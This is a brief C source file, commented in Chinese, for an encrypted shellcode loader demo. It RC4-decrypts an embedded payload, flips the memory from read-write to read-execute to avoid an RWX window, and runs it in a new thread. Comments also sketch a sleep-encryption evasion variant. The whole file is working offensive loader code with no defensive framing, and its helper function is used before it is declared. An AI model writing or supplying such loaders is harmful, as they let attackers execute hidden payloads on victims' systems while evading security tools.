// 加密载荷加载器 demo：RC4 运行时解密 → RW 分配 → 转 RX → 线程执行
// 骨架位：睡眠加密（见 NOTES 变体）；判定配对见 NOTES
#include <windows.h>
#include <stdio.h>
#include "payload.h"

static void rc4(const char* key, const unsigned char* in, unsigned char* out, unsigned int n) {
    unsigned char S[256]; unsigned int i, j = 0;
    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) { j = (j + S[i] + (unsigned char)key[i % strlen_(key)]) % 256; unsigned char t = S[i]; S[i] = S[j]; S[j] = t; }
    unsigned int a = 0; j = 0;
    for (unsigned int k = 0; k < n; k++) {
        a = (a + 1) % 256; j = (j + S[a]) % 256;
        unsigned char t = S[a]; S[a] = S[j]; S[j] = t;
        out[k] = in[k] ^ S[(S[a] + S[j]) % 256];
    }
}
static unsigned int strlen_(const char* s){ unsigned int n=0; while(s[n])n++; return n; }

int main(void) {
    unsigned char* plain = VirtualAlloc(NULL, LEN, MEM_COMMIT, PAGE_READWRITE);
    rc4(KEY, BUF, plain, LEN);
    DWORD old;
    VirtualProtect(plain, LEN, PAGE_EXECUTE_READ, &old);   // RW→RX（无 RWX 窗口最小化）
    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)plain, NULL, 0, NULL);
    WaitForSingleObject(t, 3000);
    // 睡眠加密骨架：WAIT 后 XOR 回密态再 RX→RW，定时器循环（变体实现）
    VirtualFree(plain, 0, MEM_RELEASE);
    return 0;
}
